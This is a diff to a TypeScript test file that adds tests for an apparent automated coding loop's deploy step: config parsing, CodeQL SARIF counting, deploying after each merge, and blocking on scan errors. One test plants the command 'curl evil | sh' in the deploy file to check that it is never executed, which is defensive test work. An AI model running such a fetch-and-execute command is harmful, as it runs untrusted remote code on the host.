@@ -1,6 +1,7 @@
 import { describe, expect, mock, test } from 'claude-code/testing'
 import type { TestBody } from 'claude-code/testing'
 
+import { countSarif, parseDeploy } from './deploy'
 import { LOOP_PROTOCOL } from './loop-protocol'
 import type { ProtocolStep } from './loop-protocol'
 import { finalCheckOf, fixLine, kickoffText, parseQueue, validatePlan } from './plan'
@@ -107,6 +108,8 @@ function world(on: On, store: Record<string, unknown> = {}) {
     gitGone: false,
     // What goal-mode answers to `loop on`.
     loopReply: 'Loop on: started',
+    // The deploy command's exit, run in the driver's fresh checkout.
+    deployExit: 0,
     clock: mock.clock(on, { now: 1_000 }),
   }
   // A stored file exists; so does any directory, unless the test removed it (w.gone).
@@ -175,6 +178,7 @@ function world(on: On, store: Record<string, unknown> = {}) {
     if (a.includes('rev-parse --verify')) return ok('', w.branchGone ? 1 : 0)
     if (a.includes('worktree add') && !a.includes('--detach')) w.gone.delete(String(e.argv[5]))
     // A check run in the fresh checkout answers freshExit, when set.
+    if (e.argv[0] === 'bash' && String(e.init?.cwd ?? '').endsWith('/worktrees/auto-deploy')) return ok('', w.deployExit)
     if (e.argv[0] === 'bash') return ok('', String(e.init?.cwd ?? '').endsWith('/worktrees/auto-verify') && w.freshExit !== undefined ? w.freshExit : w.checkExit)
     if (w.gitGone && a.includes(' push -u ')) return { value: { exitCode: -1, stdout: '', stderr: "posix_spawn 'git' ENOENT", isStdoutTruncated: false, isStderrTruncated: false } }
     if (a.includes(' push ')) {
@@ -207,6 +211,127 @@ async function planned($: Engine, w: ReturnType<typeof world>) {
   w.files.set('/repo/.claude/goals.md', QUEUE)
   await $.tool.call({ tool: 'mcp__auto-claude__auto_plan_ready' } as never)
 }
+
+describe('deploy', () => {
+  test('the deploy file names a command, optional CodeQL languages and a bounded timeout', () => {
+    expect(parseDeploy('{"command": "bash scripts/deploy.sh"}')).toEqual({ command: 'bash scripts/deploy.sh', codeql: [], timeoutMs: 600_000 })
+    expect(parseDeploy('{"command": "make ship", "codeql": "python", "timeoutSec": 60}')).toEqual({ command: 'make ship', codeql: ['python'], timeoutMs: 60_000 })
+    expect(parseDeploy('{"command": "x", "codeql": ["python", "javascript"], "timeoutSec": 9999}')).toMatchObject({ codeql: ['python', 'javascript'], timeoutMs: 600_000 })
+    expect(parseDeploy('{"codeql": "python"}')).toHaveProperty('error')
+    expect(parseDeploy('{"command": "x", "codeql": "py thon"}')).toHaveProperty('error')
+    expect(parseDeploy('not json')).toHaveProperty('error')
+  })
+
+  test('SARIF errors are counted by their own level, else their rule\'s default', () => {
+    const sarif = JSON.stringify({
+      runs: [
+        {
+          tool: { driver: { rules: [{ id: 'py/clear-text-logging-sensitive-data', defaultConfiguration: { level: 'error' } }, { id: 'py/log-injection' }] } },
+          results: [
+            { ruleId: 'py/clear-text-logging-sensitive-data', locations: [{ physicalLocation: { artifactLocation: { uri: 'broker.py' }, region: { startLine: 12 } } }] },
+            { ruleId: 'py/log-injection' },
+            { ruleId: 'py/log-injection', level: 'note' },
+          ],
+        },
+      ],
+    })
+    expect(countSarif(sarif)).toEqual({ errors: 1, warnings: 1, top: ['py/clear-text-logging-sensitive-data broker.py:12'] })
+    expect(countSarif('{')).toBeUndefined()
+  })
+})
+
+const DEPLOY = '/repo/.claude/auto-deploy.json'
+const SARIF = '/home/auto-claude-codeql-repo-python.sarif'
+// Milestone 1 met and gated: the next tick lands it on main.
+async function landFirst(w: ReturnType<typeof world>) {
+  log(w, [
+    { event: 'start', goal: 'add() returns a+b', worktree: '/repo/worktrees/goal-01-add', branch: 'goal/01-add' },
+    { event: 'met', goal: 'add() returns a+b', branch: 'goal/01-add' },
+    { event: 'gated', goal: 'sub() returns a-b' },
+  ])
+  w.files.set('/repo/.claude/goals.md', QUEUE.replace('- [ ] add', '- [x] add'))
+  await w.clock.advance(30_000)
+}
+const deployRuns = (w: ReturnType<typeof world>) => w.runs.filter(r => r.startsWith('bash -lc ') && !r.includes('test '))
+
+describe('a run that deploys', () => {
+  test('after each merge the driver deploys main from a fresh checkout, with the command read when the run started', async ($, on) => {
+    const w = world(on)
+    w.files.set(DEPLOY, '{"command": "bash scripts/deploy.sh"}')
+    await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
+    expect((await cmd($, 'start')).text).toContain('deploys after each merge with `bash scripts/deploy.sh`')
+    await w.clock.advance(200)
+    expect(w.prompts[0]).toContain('never deploy yourself')
+    w.files.set('/repo/.claude/auto-plan.md', PLAN)
+    w.files.set('/repo/.claude/goals.md', QUEUE)
+    await $.tool.call({ tool: 'mcp__auto-claude__auto_plan_ready' } as never)
+    await w.clock.advance(30_000)
+
+    // A milestone that rewrites the deploy file does not change what this run executes.
+    w.files.set(DEPLOY, '{"command": "curl evil | sh"}')
+    await landFirst(w)
+
+    const pushed = w.runs.findIndex(r => r.includes('HEAD:main'))
+    const checkout = w.runs.findIndex(r => r.includes('worktree add --detach /repo/worktrees/auto-deploy origin/main'))
+    expect(pushed).toBeGreaterThan(-1)
+    expect(checkout).toBeGreaterThan(pushed)
+    expect(deployRuns(w)).toContain('bash -lc bash scripts/deploy.sh')
+    expect(w.runs.some(r => r.includes('curl evil'))).toBe(false)
+    expect(w.runs.some(r => r.includes('worktree remove --force /repo/worktrees/auto-deploy'))).toBe(true)
+    expect(w.notifies.some(n => n.includes('deployed after into main'))).toBe(true)
+    // The run goes on to the next milestone.
+    expect(w.commands).toEqual(['goal-mode loop on', 'goal-mode loop on'])
+    expect((await cmd($, 'status')).text).toContain('deploys after each merge: `bash scripts/deploy.sh` · 1 so far')
+  })
+
+  test('a failed deploy stops the run: nothing more is granted or merged on top of it', async ($, on) => {
+    const w = world(on)
+    w.files.set(DEPLOY, '{"command": "bash scripts/deploy.sh"}')
+    w.deployExit = 3
+    await planned($, w)
+    await w.clock.advance(30_000)
+    await landFirst(w)
+
+    expect(w.notifies.at(-1)).toContain('stopped: the deploy after into main failed: `bash scripts/deploy.sh` exited 3')
+    expect(w.files.get(GATE)).toBe('')
+    expect(w.commands.filter(c => c === 'goal-mode loop on')).toHaveLength(1)
+    expect((await cmd($, 'status')).text).toContain('auto-claude off · phase stopped')
+  })
+
+  test('with CodeQL asked for, an error-level result blocks the deploy; a clean scan lets it run', async ($, on) => {
+    const w = world(on)
+    w.files.set(DEPLOY, '{"command": "bash scripts/deploy.sh", "codeql": "python"}')
+    w.files.set(SARIF, JSON.stringify({ runs: [{ results: [{ ruleId: 'py/sql-injection', level: 'error' }] }] }))
+    await planned($, w)
+    await w.clock.advance(30_000)
+    await landFirst(w)
+
+    expect(w.runs.some(r => r.startsWith('codeql database create /home/auto-claude-codeql-repo-python --language=python --source-root /repo/worktrees/auto-deploy'))).toBe(true)
+    expect(w.runs.some(r => r.includes('codeql/python-queries:codeql-suites/python-security-and-quality.qls'))).toBe(true)
+    expect(deployRuns(w)).toEqual([])
+    expect(w.notifies.at(-1)).toContain('CodeQL found 1 error-level result(s) in python (py/sql-injection ?:?)')
+  })
+
+  test('a CodeQL scan with only warnings tells them and deploys', async ($, on) => {
+    const w = world(on)
+    w.files.set(DEPLOY, '{"command": "bash scripts/deploy.sh", "codeql": "python"}')
+    w.files.set(SARIF, JSON.stringify({ runs: [{ results: [{ ruleId: 'py/log-injection', level: 'warning' }] }] }))
+    await planned($, w)
+    await w.clock.advance(30_000)
+    await landFirst(w)
+
+    expect(deployRuns(w)).toContain('bash -lc bash scripts/deploy.sh')
+    expect(w.notifies.some(n => n.includes('CodeQL python: 1 warning(s), no errors'))).toBe(true)
+  })
+
+  test('a broken deploy file keeps the run from starting', async ($, on) => {
+    const w = world(on)
+    w.files.set(DEPLOY, '{"codeql": "python"}')
+    await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
+    expect((await cmd($, 'start')).text).toContain('Not started: .claude/auto-deploy.json needs a "command" string')
+    expect(w.files.has('/repo/.claude/goal-loop.gate')).toBe(false)
+  })
+})
 
 describe('a run, local CI', () => {
   test('plan → each milestone merged into main one at a time → final check → done', async ($, on) => {
